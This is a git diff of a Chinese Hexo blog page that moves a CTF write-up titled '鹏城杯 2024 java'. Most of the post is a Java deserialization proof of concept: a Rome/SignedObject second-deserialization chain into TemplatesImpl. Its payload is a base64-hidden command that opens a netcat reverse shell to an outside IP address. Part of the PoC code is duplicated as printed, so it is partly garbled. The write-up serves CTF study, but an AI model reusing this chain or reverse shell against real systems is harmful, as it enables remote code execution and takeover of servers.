@@ -216,82 +216,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Charger0">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Charger0">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/" class="post-title-link" itemprop="url">鹏城杯 2024 java</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2024-11-11 03:38:24" itemprop="dateCreated datePublished" datetime="2024-11-11T03:38:24+08:00">2024-11-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-11-13 17:51:55" itemprop="dateModified" datetime="2024-11-13T17:51:55+08:00">2024-11-13</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p><img src="/../imgs/$%7Bfiilename%7D/image-20241112155540909.png" alt="image-20241112155540909"></p>
-<p><img src="/../imgs/$%7Bfiilename%7D/wps2.jpg" alt="img"> </p>
-<p>com.backdoor.classes.hello#hashCode调用com.backdoor.classes.hello#eval 调用com.backdoor.classes.look#runcmd</p>
-<p>com.backdoor.classes.look#runcmd里看到了jndi。</p>
-<p>出题人可能想让sink点是runcmd。</p>
-<p>Util这里限制了resolveclass</p>
-<p><img src="/../imgs/$%7Bfiilename%7D/wps3.jpg" alt="c"> </p>
-<p>resolveclass用二次反序列化绕过</p>
-<p>有rome依赖，用rome进二次反序列化 ，进而Templateimpl</p>
-<p><img src="/../imgs/$%7Bfiilename%7D/wps4.jpg" alt="img"> </p>
-<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">最终poc</span><br><span class="line"></span><br><span class="line">String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">// 创建恶意类</span><br><span class="line">ClassPool classPool = ClassPool.**getDefault**();</span><br><span class="line">classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">CtClass ctClass = classPool.makeClass(&quot;d&quot;);</span><br><span class="line">ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">ctClass.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,bmMgMTM5LjIyNC4xMzAuMTgzIDEwMDAyIC1lIHNo&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;);</span><br><span class="line">byte[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">// 创建TemplatesImpl对象</span><br><span class="line">Object templateImpl = Class.**forName**(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">**setFiled**(templateImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">**setFiled**(templateImpl, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">**setFiled**(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span><br><span class="line">ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">ObjectBean expObjectBean = new ObjectBean(Templates.class, templateImpl);</span><br><span class="line">**setFieldValue**(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line"></span><br><span class="line">KeyPairGenerator kpg = KeyPairGenerator.**getInstance**(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject=new SignedObject(hashMap, kp.getPrivate(),Signature.**getInstance**(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**setFiled**(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span><br><span class="line">ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">ObjectBean expObjectBean = new ObjectBean(Templates.class, templateImpl);</span><br><span class="line">**setFieldValue**(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line"></span><br><span class="line">KeyPairGenerator kpg = KeyPairGenerator.**getInstance**(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject=new SignedObject(hashMap, kp.getPrivate(),Signature.**getInstance**(&quot;DSA&quot;));</span><br><span class="line">//Rome</span><br><span class="line">ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);</span><br><span class="line">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;&quot;);</span><br><span class="line">**setFieldValue**(badAttributeValueExpException,&quot;val&quot;,toStringBean);</span><br><span class="line"></span><br><span class="line">//执行序列化和反序列化操作，并且返回序列化数据用于后续的payload生成</span><br><span class="line">String s = **serialize2Base64**(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">byte[] serializedData = Base64.**getMimeDecoder**().decode(s);</span><br><span class="line">String option = **deserializeData**(serializedData);</span><br><span class="line">return s;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/10/ByteCTF2024_ezauth/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -583,6 +507,82 @@ key_value = ET.SubElement(key_info, &#39;KeyValue&#39;)
 <p><a target="_blank" rel="noopener" href="https://users.dcc.uchile.cl/~pcamacho/tutorial/web/xmlsec/xmlsec.html#htoc7">使用 XMLSec 进行 XML 签名和 XML 加密简介 — An Introduction to XML Signature and XML Encryption with XMLSec</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.samltool.com/generic_sso_res.php">SAML Response Examples - SAML Assertion Example | SAMLTool.com</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/81/#ezauth">ByteCTF 2024 By W&amp;M - W&amp;M Team</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Charger0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Charger0">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/" class="post-title-link" itemprop="url">鹏城杯 2024 java</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-11-11 03:38:24" itemprop="dateCreated datePublished" datetime="2024-11-11T03:38:24+08:00">2024-11-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-11-13 17:51:55" itemprop="dateModified" datetime="2024-11-13T17:51:55+08:00">2024-11-13</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p><img src="/../imgs/$%7Bfiilename%7D/image-20241112155540909.png" alt="image-20241112155540909"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps2.jpg" alt="img"> </p>
+<p>com.backdoor.classes.hello#hashCode调用com.backdoor.classes.hello#eval 调用com.backdoor.classes.look#runcmd</p>
+<p>com.backdoor.classes.look#runcmd里看到了jndi。</p>
+<p>出题人可能想让sink点是runcmd。</p>
+<p>Util这里限制了resolveclass</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps3.jpg" alt="c"> </p>
+<p>resolveclass用二次反序列化绕过</p>
+<p>有rome依赖，用rome进二次反序列化 ，进而Templateimpl</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps4.jpg" alt="img"> </p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">最终poc</span><br><span class="line"></span><br><span class="line">String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">// 创建恶意类</span><br><span class="line">ClassPool classPool = ClassPool.**getDefault**();</span><br><span class="line">classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">CtClass ctClass = classPool.makeClass(&quot;d&quot;);</span><br><span class="line">ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">ctClass.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,bmMgMTM5LjIyNC4xMzAuMTgzIDEwMDAyIC1lIHNo&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;);</span><br><span class="line">byte[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">// 创建TemplatesImpl对象</span><br><span class="line">Object templateImpl = Class.**forName**(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">**setFiled**(templateImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">**setFiled**(templateImpl, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">**setFiled**(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span><br><span class="line">ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">ObjectBean expObjectBean = new ObjectBean(Templates.class, templateImpl);</span><br><span class="line">**setFieldValue**(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line"></span><br><span class="line">KeyPairGenerator kpg = KeyPairGenerator.**getInstance**(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject=new SignedObject(hashMap, kp.getPrivate(),Signature.**getInstance**(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**setFiled**(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span><br><span class="line">ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">ObjectBean expObjectBean = new ObjectBean(Templates.class, templateImpl);</span><br><span class="line">**setFieldValue**(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line"></span><br><span class="line">KeyPairGenerator kpg = KeyPairGenerator.**getInstance**(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject=new SignedObject(hashMap, kp.getPrivate(),Signature.**getInstance**(&quot;DSA&quot;));</span><br><span class="line">//Rome</span><br><span class="line">ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);</span><br><span class="line">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;&quot;);</span><br><span class="line">**setFieldValue**(badAttributeValueExpException,&quot;val&quot;,toStringBean);</span><br><span class="line"></span><br><span class="line">//执行序列化和反序列化操作，并且返回序列化数据用于后续的payload生成</span><br><span class="line">String s = **serialize2Base64**(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">byte[] serializedData = Base64.**getMimeDecoder**().decode(s);</span><br><span class="line">String option = **deserializeData**(serializedData);</span><br><span class="line">return s;</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
